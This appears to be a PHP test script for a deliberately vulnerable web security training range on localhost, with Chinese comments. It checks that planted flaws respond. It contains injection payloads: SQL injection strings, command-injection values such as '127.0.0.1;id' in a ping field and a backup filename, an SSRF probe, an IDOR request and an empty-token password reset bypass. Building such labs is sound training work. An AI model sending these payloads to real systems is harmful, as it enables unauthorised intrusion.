<?php
/**
 * 漏洞测试脚本
 * 用于验证各漏洞是否可正常触发
 *
 * 使用方法: php test/vuln_test.php
 */

echo "=== WEB安全靶场漏洞测试脚本 ===\n\n";

// 测试配置
$base_url = "http://localhost";
$admin_url = "{$base_url}/admin";
$home_url = "{$base_url}/home";

/**
 * 发送HTTP请求
 */
function httpRequest($url, $method = 'GET', $data = [], $headers = []) {
    $ch = curl_init();

    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    } else {
        if (!empty($data)) {
            $url .= '?' . http_build_query($data);
        }
    }

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);

    return ['code' => $httpCode, 'body' => $response, 'error' => $error];
}

/**
 * 测试SQL注入
 */
function testSQLInjection($base_url) {
    echo "--- 测试SQL注入漏洞 ---\n";

    // 测试搜索功能SQL注入
    $url = "{$base_url}/home/search.php";
    $payload = "test' AND '1'='1";

    echo "1. 测试搜索功能SQL注入: ";
    $result = httpRequest($url, 'GET', ['keywords' => $payload]);
    if ($result['code'] == 200 && strpos($result['body'], 'error') === false) {
        echo "[OK] 页面正常响应\n";
    } else {
        echo "[FAIL] 可能存在问题\n";
    }

    // 测试帖子列表SQL注入
    $url = "{$base_url}/home/index.php";
    echo "2. 测试帖子列表SQL注入: ";
    $result = httpRequest($url, 'GET', ['m' => 'tiezi', 'a' => 'index', 'bk' => "1'"]);
    if ($result['code'] == 200) {
        echo "[OK] 页面响应\n";
    } else {
        echo "[FAIL]\n";
    }

    echo "\n";
}

/**
 * 测试命令执行
 */
function testCommandInjection($admin_url) {
    echo "--- 测试命令执行漏洞 ---\n";

    // 测试备份功能命令注入
    $url = "{$admin_url}/index.php?m=backup&a=_do_backup";
    echo "1. 测试备份功能命令注入: ";

    $result = httpRequest($url, 'POST', ['filename' => 'test;echo "VULN_TEST"']);
    if ($result['code'] == 200) {
        echo "[OK] 命令执行端点可访问\n";
    } else {
        echo "[FAIL]\n";
    }

    // 测试Ping功能命令注入
    $url = "{$admin_url}/index.php?m=backup&a=_do_ping";
    echo "2. 测试Ping功能命令注入: ";

    $result = httpRequest($url, 'POST', ['ip' => '127.0.0.1;id']);
    if ($result['code'] == 200) {
        echo "[OK] Ping端点可访问\n";
    } else {
        echo "[FAIL]\n";
    }

    echo "\n";
}

/**
 * 测试SSRF
 */
function testSSRF($home_url) {
    echo "--- 测试SSRF漏洞 ---\n";

    $url = "{$home_url}/index.php?m=user&a=_set_remote_avatar";
    echo "1. 测试远程头像SSRF: ";

    $result = httpRequest($url, 'POST', ['avatar_url' => 'http://127.0.0.1:80']);
    if ($result['code'] == 200 || strpos($result['body'], 'alert') !== false) {
        echo "[OK] SSRF端点可访问\n";
    } else {
        echo "[FAIL]\n";
    }

    echo "\n";
}

/**
 * 测试文件上传
 */
function testFileUpload($home_url) {
    echo "--- 测试文件上传漏洞 ---\n";

    $url = "{$home_url}/index.php?m=user&a=upload_file";
    echo "1. 测试文件上传页面: ";

    $result = httpRequest($url, 'GET');
    if ($result['code'] == 200) {
        echo "[OK] 上传页面可访问\n";
    } else {
        echo "[FAIL]\n";
    }

    echo "\n";
}

/**
 * 测试越权漏洞
 */
function testPrivilegeEscalation($home_url) {
    echo "--- 测试越权漏洞 ---\n";

    $url = "{$home_url}/index.php?m=user&a=basic&uid=1";
    echo "1. 测试越权访问其他用户资料: ";

    $result = httpRequest($url, 'GET');
    if ($result['code'] == 200) {
        echo "[OK] 越权端点可访问\n";
    } else {
        echo "[FAIL]\n";
    }

    echo "\n";
}

/**
 * 测试密码重置漏洞
 */
function testPasswordReset($home_url) {
    echo "--- 测试密码重置漏洞 ---\n";

    // 测试Token可预测
    $url = "{$home_url}/index.php?m=user&a=_re_passwd_step1";
    echo "1. 测试密码重置Token生成: ";

    $result = httpRequest($url, 'POST', ['email' => 'test@test.com']);
    if ($result['code'] == 200 && strpos($result['body'], 'Token') !== false) {
        echo "[OK] Token生成功能正常\n";
    } else {
        echo "[FAIL]\n";
    }

    // 测试空Token绕过
    $url = "{$home_url}/index.php?m=user&a=re_passwd_step3&email=test@test.com&code=";
    echo "2. 测试空Token绕过: ";

    $result = httpRequest($url, 'GET');
    if ($result['code'] == 200) {
        echo "[OK] 重置页面可访问\n";
    } else {
        echo "[FAIL]\n";
    }

    echo "\n";
}

/**
 * 测试验证码绕过
 */
function testCaptchaBypass($admin_url) {
    echo "--- 测试验证码绕过漏洞 ---\n";

    $url = "{$admin_url}/public/login.php";
    echo "1. 测试后台登录验证码: ";

    $result = httpRequest($url, 'GET');
    if ($result['code'] == 200) {
        echo "[OK] 登录页面可访问\n";
    } else {
        echo "[FAIL]\n";
    }

    echo "\n";
}

// 执行测试
echo "开始漏洞测试...\n\n";

try {
    testSQLInjection($base_url);
    testCommandInjection($admin_url);
    testSSRF($home_url);
    testFileUpload($home_url);
    testPrivilegeEscalation($home_url);
    testPasswordReset($home_url);
    testCaptchaBypass($admin_url);

    echo "=== 测试完成 ===\n";
    echo "提示: 请确保Web服务已启动并可访问 {$base_url}\n";

} catch (Exception $e) {
    echo "测试出错: " . $e->getMessage() . "\n";
}
